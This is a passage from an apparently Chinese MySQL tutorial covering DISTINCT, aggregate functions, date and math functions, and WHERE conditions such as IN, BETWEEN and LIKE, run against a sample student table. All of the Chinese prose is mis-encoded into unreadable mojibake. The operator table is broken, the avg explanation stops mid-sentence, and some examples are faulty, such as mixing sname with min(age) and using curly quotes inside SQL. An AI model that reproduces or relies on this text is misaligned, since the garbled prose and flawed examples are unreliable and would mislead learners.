æ—¶éœ€è¦æ³¨æ„ï¼š<br><strong>åœ¨SELECTæŸ¥è¯¢è¯­å¥ä¸­DISTINCTå…³é”®å­—åªèƒ½ç”¨åœ¨ç¬¬ä¸€ä¸ªæ‰€æŸ¥åˆ—åä¹‹å‰ã€‚</strong><br>MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select distinct gender from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185517964.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="6-ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¸¾ä¾‹åŠ è¿ç®—ç¬¦ï¼‰"><a href="#6-ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¸¾ä¾‹åŠ è¿ç®—ç¬¦ï¼‰" class="headerlink" title="6.ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¸¾ä¾‹åŠ è¿ç®—ç¬¦ï¼‰"></a>6.ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¸¾ä¾‹åŠ è¿ç®—ç¬¦ï¼‰</h2><p>åœ¨SELECTæŸ¥è¯¢è¯­å¥ä¸­è¿˜å¯ä»¥ä½¿ç”¨åŠ å‡ä¹˜é™¤è¿ç®—ç¬¦ã€‚<br>æŸ¥è¯¢å­¦ç”Ÿ10å¹´åçš„å¹´é¾„ MySQLå‘½ä»¤ï¼š</p><p>â€‹     <code>select sname,age+10 from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185922370.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="åã€å‡½æ•°"><a href="#åã€å‡½æ•°" class="headerlink" title="åã€å‡½æ•°"></a>åã€å‡½æ•°</h1><p>åœ¨æ­¤ï¼Œå…ˆå‡†å¤‡æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- åˆ›å»ºæ•°æ®åº“<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- åˆ›å»ºstudentè¡¨<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- å‘studentè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-èšåˆå‡½æ•°"><a href="#1-èšåˆå‡½æ•°" class="headerlink" title="1.èšåˆå‡½æ•°"></a>1.èšåˆå‡½æ•°</h2><p>åœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸æœ‰ç±»ä¼¼çš„éœ€æ±‚ï¼šç»Ÿè®¡æŸä¸ªå­—æ®µçš„æœ€å¤§å€¼ã€æœ€å°å€¼ã€<br>å¹³å‡å€¼ç­‰ç­‰ã€‚ä¸ºæ­¤ï¼ŒMySQLä¸­æä¾›äº†èšåˆå‡½æ•°æ¥å®ç°è¿™äº›åŠŸèƒ½ã€‚æ‰€è°“èšåˆï¼Œå°±æ˜¯å°†å¤šè¡Œæ±‡æ€»æˆä¸€è¡Œï¼›å…¶å®ï¼Œæ‰€æœ‰çš„èšåˆå‡½æ•°å‡å¦‚æ­¤â€”â€”è¾“å…¥å¤šè¡Œï¼Œè¾“å‡ºä¸€è¡Œã€‚èšåˆå‡½æ•°å…·æœ‰è‡ªåŠ¨æ»¤ç©ºçš„åŠŸèƒ½ï¼Œè‹¥æŸä¸€ä¸ªå€¼ä¸ºNULLï¼Œé‚£ä¹ˆä¼šè‡ªåŠ¨å°†å…¶è¿‡æ»¤ä½¿å…¶ä¸å‚ä¸è¿ç®—ã€‚<br><strong>èšåˆå‡½æ•°ä½¿ç”¨è§„åˆ™ ï¼š</strong><br>åªæœ‰SELECTå­å¥å’ŒHAVINGå­å¥ã€ORDER BYå­å¥ä¸­èƒ½å¤Ÿä½¿ç”¨èšåˆå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåœ¨WHEREå­å¥ä¸­ä½¿ç”¨èšåˆå‡½æ•°æ˜¯é”™è¯¯çš„ã€‚<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å­¦ä¹ å¸¸ç”¨èšåˆå‡½æ•°ã€‚</p><h3 id="1-1ã€countï¼ˆï¼‰"><a href="#1-1ã€countï¼ˆï¼‰" class="headerlink" title="1.1ã€countï¼ˆï¼‰"></a>1.1ã€countï¼ˆï¼‰</h3><p>ç»Ÿè®¡è¡¨ä¸­æ•°æ®çš„è¡Œæ•°æˆ–è€…ç»Ÿè®¡æŒ‡å®šåˆ—å…¶å€¼ä¸ä¸ºNULLçš„æ•°æ®ä¸ªæ•°<br><em>æŸ¥è¯¢æœ‰å¤šå°‘è¯¥è¡¨ä¸­æœ‰å¤šå°‘äºº</em><br>MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select count(*) from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302190940321.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="1-2ã€maxï¼ˆï¼‰"><a href="#1-2ã€maxï¼ˆï¼‰" class="headerlink" title="1.2ã€maxï¼ˆï¼‰"></a>1.2ã€maxï¼ˆï¼‰</h3><p>è®¡ç®—æŒ‡å®šåˆ—çš„æœ€å¤§å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹åˆ™ä½¿ç”¨å­—ç¬¦ä¸²æ’åºè¿ç®—</p><p><em>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å¤§çš„å­¦ç”Ÿ</em><br>MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select max(age) from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210304164639342.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="1-3ã€minï¼ˆï¼‰"><a href="#1-3ã€minï¼ˆï¼‰" class="headerlink" title="1.3ã€minï¼ˆï¼‰"></a>1.3ã€minï¼ˆï¼‰</h3><p>è®¡ç®—æŒ‡å®šåˆ—çš„æœ€å°å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹åˆ™ä½¿ç”¨å­—ç¬¦ä¸²æ’åºè¿ç®—</p><p>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å°çš„å­¦ç”Ÿ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select sname,min(age) from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302191531189.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="1-4ã€sumï¼ˆï¼‰"><a href="#1-4ã€sumï¼ˆï¼‰" class="headerlink" title="1.4ã€sumï¼ˆï¼‰"></a>1.4ã€sumï¼ˆï¼‰</h3><p>è®¡ç®—æŒ‡å®šåˆ—çš„æ•°å€¼å’Œï¼Œå¦‚æœæŒ‡å®šåˆ—ç±»å‹ä¸æ˜¯æ•°å€¼ç±»å‹åˆ™è®¡ç®—ç»“æœä¸º0<br>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªçš„æ€»å’Œ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select sum(age) from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302192155981.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="1-5ã€avgï¼ˆï¼‰"><a href="#1-5ã€avgï¼ˆï¼‰" class="headerlink" title="1.5ã€avgï¼ˆï¼‰"></a>1.5ã€avgï¼ˆï¼‰</h3><p>è®¡ç®—æŒ‡å®šåˆ—çš„å¹³å‡å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—ç±»å‹ä¸æ˜¯æ•°å€¼ç±»å‹åˆ™è®¡ç®—ç»“æœä¸º</p><p>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªçš„å¹³å‡æ•° MySQLå‘½ä»¤ï¼š</p><p>â€‹    select avg(age) from student;</p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302192048399.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-å…¶ä»–å¸¸ç”¨å‡½æ•°"><a href="#2-å…¶ä»–å¸¸ç”¨å‡½æ•°" class="headerlink" title="2.å…¶ä»–å¸¸ç”¨å‡½æ•°"></a>2.å…¶ä»–å¸¸ç”¨å‡½æ•°</h2><p>è¿™é‡Œæˆ‘å°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ï¼ŒåŸºæœ¬æ··ä¸ªçœ¼ç†Ÿï¼Œä»¥åç”¨åˆ°å†ç»†è¯´</p><h3 id="2-1ã€æ—¶é—´å‡½æ•°"><a href="#2-1ã€æ—¶é—´å‡½æ•°" class="headerlink" title="2.1ã€æ—¶é—´å‡½æ•°"></a>2.1ã€æ—¶é—´å‡½æ•°</h3><p>-<br>  â€‹    SELECT NOW();</p><ul><li>â€‹    SELECT DAY (NOW());</li><li>â€‹    SELECT DATE (NOW());</li><li>â€‹    SELECT TIME (NOW());</li><li>â€‹    SELECT YEAR (NOW());</li><li>â€‹    SELECT MONTH (NOW());</li><li>â€‹    SELECT CURRENT_DATE();</li><li>â€‹    SELECT CURRENT_TIME();</li><li>â€‹    SELECT CURRENT_TIMESTAMP();</li><li>â€‹    SELECT ADDTIME(â€˜14:23:12â€™,â€™01:02:01â€™);</li><li>â€‹    SELECT DATE_ADD(NOW(),INTERVAL 1 DAY);</li><li>â€‹    SELECT DATE_ADD(NOW(),INTERVAL 1 MONTH);</li><li>â€‹    SELECT DATE_SUB(NOW(),INTERVAL 1 DAY);</li><li>â€‹    SELECT DATE_SUB(NOW(),INTERVAL 1 MONTH);</li><li>â€‹    SELECT DATEDIFF(â€˜2019-07-22â€™,â€™2019-05-05â€™);</li></ul><h3 id="2-2ã€å­—ç¬¦ä¸²å‡½æ•°"><a href="#2-2ã€å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="2.2ã€å­—ç¬¦ä¸²å‡½æ•°"></a>2.2ã€å­—ç¬¦ä¸²å‡½æ•°</h3>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">--è¿æ¥å‡½æ•°<br>SELECT CONCAT ()<br>--<br>SELECT INSTR ();<br>--ç»Ÿè®¡é•¿åº¦<br>SELECT LENGTH();<br><br></code></pre></td></tr></table></figure><h3 id="2-3ã€æ•°å­¦å‡½æ•°"><a href="#2-3ã€æ•°å­¦å‡½æ•°" class="headerlink" title="2.3ã€æ•°å­¦å‡½æ•°"></a>2.3ã€æ•°å­¦å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- ç»å¯¹å€¼<br>SELECT ABS(-136);<br>-- å‘ä¸‹å–æ•´<br>SELECT FLOOR(3.14);<br>-- å‘ä¸Šå–æ•´<br>SELECT CEILING(3.14);<br><br></code></pre></td></tr></table></figure><h1 id="åä¸€ã€æ¡ä»¶æŸ¥è¯¢"><a href="#åä¸€ã€æ¡ä»¶æŸ¥è¯¢" class="headerlink" title="åä¸€ã€æ¡ä»¶æŸ¥è¯¢"></a>åä¸€ã€æ¡ä»¶æŸ¥è¯¢</h1><p>æ•°æ®åº“ä¸­å­˜æœ‰å¤§é‡æ•°æ®ï¼Œæˆ‘ä»¬å¯æ ¹æ®éœ€æ±‚è·å–æŒ‡å®šçš„æ•°æ®ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯åœ¨æŸ¥è¯¢è¯­å¥ä¸­é€šè¿‡WHEREå­å¥æŒ‡å®šæŸ¥è¯¢æ¡ä»¶å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œè¿‡æ»¤ã€‚<br>åœ¨å¼€å§‹å­¦ä¹ æ¡ä»¶æŸ¥è¯¢ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- åˆ›å»ºæ•°æ®åº“<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- åˆ›å»ºstudentè¡¨<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- å‘studentè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1012&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1013&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æŸ¥è¯¢"><a href="#1-ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æŸ¥è¯¢" class="headerlink" title="1.ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æŸ¥è¯¢"></a>1.ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æŸ¥è¯¢</h2><p>åœ¨WHEREä¸­å¯ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦è¿›è¡Œæ¡ä»¶æŸ¥è¯¢ï¼Œå¸¸ç”¨çš„å…³ç³»è¿ç®—ç¬¦å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>å…³ç³»è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&#x3D;</td><td>ç­‰äº</td></tr><tr><td>&lt;&gt;</td><td>ä¸ç­‰äº</td></tr><tr><td>!&#x3D;</td><td>ä¸ç­‰äº</td></tr><tr><td>&lt;</td><td>å°äº</td></tr><tr><td>&lt;&#x3D;</td><td>å°äºç­‰äº</td></tr></tbody></table><blockquote><p>| å¤§äº<br>&#x3D;| å¤§äºç­‰äº  </p></blockquote><p>æŸ¥è¯¢å¹´é¾„ç­‰äºæˆ–å¤§äº17çš„å­¦ç”Ÿçš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where age&gt;=17;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302194156529.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-ä½¿ç”¨INå…³é”®å­—æŸ¥è¯¢"><a href="#2-ä½¿ç”¨INå…³é”®å­—æŸ¥è¯¢" class="headerlink" title="2.ä½¿ç”¨INå…³é”®å­—æŸ¥è¯¢"></a>2.ä½¿ç”¨INå…³é”®å­—æŸ¥è¯¢</h2><p>INå…³é”®å­—ç”¨äºåˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åœ¨æŒ‡å®šé›†åˆä¸­ã€‚å¦‚æœå­—æ®µçš„å€¼æ°å¥½åœ¨æŒ‡å®šçš„é›†åˆä¸­ï¼Œåˆ™å°†å­—æ®µæ‰€åœ¨çš„è®°å½•å°†æŸ»è¯¢å‡ºæ¥ã€‚</p><p>æŸ¥è¯¢sidä¸ºS_1002å’ŒS_1003çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sid in (&#39;S_1002&#39;,&#39;S_1003&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302195114401.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢sidä¸ºS_1001ä»¥å¤–çš„å­¦ç”Ÿçš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sid not in (&#39;S_1001&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302195321878.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-ä½¿ç”¨BETWEEN-ANDå…³é”®å­—æŸ¥è¯¢"><a href="#3-ä½¿ç”¨BETWEEN-ANDå…³é”®å­—æŸ¥è¯¢" class="headerlink" title="3.ä½¿ç”¨BETWEEN ANDå…³é”®å­—æŸ¥è¯¢"></a>3.ä½¿ç”¨BETWEEN ANDå…³é”®å­—æŸ¥è¯¢</h2><p>BETWEEN ANDç”¨äºåˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åœ¨æŒ‡å®šçš„èŒƒå›´ä¹‹å†…ã€‚å¦‚æœå­—æ®µçš„å€¼åœ¨æŒ‡å®šèŒƒå›´å†…ï¼Œåˆ™å°†æ‰€åœ¨çš„è®°å½•å°†æŸ¥è¯¢å‡ºæ¥<br>æŸ¥è¯¢15åˆ°18å²çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where age between 15 and 18;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030219575915.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢ä¸æ˜¯15åˆ°18å²çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where age not between 15 and 18;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302195913168.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-ä½¿ç”¨ç©ºå€¼æŸ¥è¯¢"><a href="#4-ä½¿ç”¨ç©ºå€¼æŸ¥è¯¢" class="headerlink" title="4.ä½¿ç”¨ç©ºå€¼æŸ¥è¯¢"></a>4.ä½¿ç”¨ç©ºå€¼æŸ¥è¯¢</h2><p>åœ¨MySQLä¸­ï¼Œä½¿ç”¨ IS NULLå…³é”®å­—åˆ¤æ–­å­—æ®µçš„å€¼æ˜¯å¦ä¸ºç©ºå€¼ã€‚è¯·æ³¨æ„ï¼šç©ºå€¼NULLä¸åŒäº0ï¼Œä¹Ÿä¸åŒäºç©ºå­—ç¬¦ä¸²<br><strong>ç”±äºstudentè¡¨æ²¡æœ‰ç©ºå€¼å°±ä¸æ¼”ç¤ºæŸ¥è¯¢ç©ºå€¼çš„äº†</strong><br>æŸ¥è¯¢snameä¸ä¸ºç©ºå€¼çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname is not null;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302201810965.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5-ä½¿ç”¨ANDå…³é”®å­—æŸ¥è¯¢"><a href="#5-ä½¿ç”¨ANDå…³é”®å­—æŸ¥è¯¢" class="headerlink" title="5.ä½¿ç”¨ANDå…³é”®å­—æŸ¥è¯¢"></a>5.ä½¿ç”¨ANDå…³é”®å­—æŸ¥è¯¢</h2><p>åœ¨MySQLä¸­å¯ä½¿ç”¨ANDå…³é”®å­—å¯ä»¥è¿æ¥ä¸¤ä¸ªæˆ–è€…å¤šä¸ªæŸ¥è¯¢æ¡ä»¶ã€‚<br>æŸ¥è¯¢å¹´çºªå¤§äº15ä¸”æ€§åˆ«ä¸ºmaleçš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where age&gt;15 and gender=&#39;male&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302202328945.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="6-ä½¿ç”¨ORå…³é”®å­—æŸ¥è¯¢"><a href="#6-ä½¿ç”¨ORå…³é”®å­—æŸ¥è¯¢" class="headerlink" title="6.ä½¿ç”¨ORå…³é”®å­—æŸ¥è¯¢"></a>6.ä½¿ç”¨ORå…³é”®å­—æŸ¥è¯¢</h2><p>åœ¨ä½¿ç”¨SELECTè¯­å¥æŸ¥è¯¢æ•°æ®æ—¶å¯ä½¿ç”¨ORå…³é”®å­—è¿æ¥å¤šä¸ªæŸ»è¯¢æ¡ä»¶ã€‚åœ¨ä½¿ç”¨ORå…³é”®å­—æ—¶ï¼Œåªè¦è®°å½•æ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ä¸ªæ¡ä»¶å°±ä¼šè¢«æŸ¥è¯¢å‡ºæ¥<br>æŸ¥è¯¢å¹´çºªå¤§äº15æˆ–è€…æ€§åˆ«ä¸ºmaleçš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where age&gt;15 or gender=&#39;male&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302202642783.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="7-ä½¿ç”¨LIKEå…³é”®å­—æŸ¥è¯¢"><a href="#7-ä½¿ç”¨LIKEå…³é”®å­—æŸ¥è¯¢" class="headerlink" title="7.ä½¿ç”¨LIKEå…³é”®å­—æŸ¥è¯¢"></a>7.ä½¿ç”¨LIKEå…³é”®å­—æŸ¥è¯¢</h2><p>MySQLä¸­å¯ä½¿ç”¨LIKEå…³é”®å­—å¯ä»¥åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒ¹é…</p><h3 id="7-1-æ™®é€šå­—ç¬¦ä¸²"><a href="#7-1-æ™®é€šå­—ç¬¦ä¸²" class="headerlink" title="7.1 æ™®é€šå­—ç¬¦ä¸²"></a>7.1 æ™®é€šå­—ç¬¦ä¸²</h3><p>æŸ¥è¯¢snameä¸­ä¸wangåŒ¹é…çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;wang&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/202103022030077.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="7-2-å«æœ‰-é€šé…çš„å­—ç¬¦ä¸²"><a href="#7-2-å«æœ‰-é€šé…çš„å­—ç¬¦ä¸²" class="headerlink" title="7.2 å«æœ‰%é€šé…çš„å­—ç¬¦ä¸²"></a>7.2 å«æœ‰%é€šé…çš„å­—ç¬¦ä¸²</h3><p>%ç”¨äºåŒ¹é…ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œa%â€åŒ¹é…ä»¥å­—ç¬¦aå¼€å§‹ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²<br>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥liå¼€å§‹çš„è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;li%&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302203419987.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥gç»“å°¾çš„è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;%g&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210302203654189.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢å­¦ç”Ÿå§“ååŒ…å«sçš„è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;%s%&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302203828429.png" 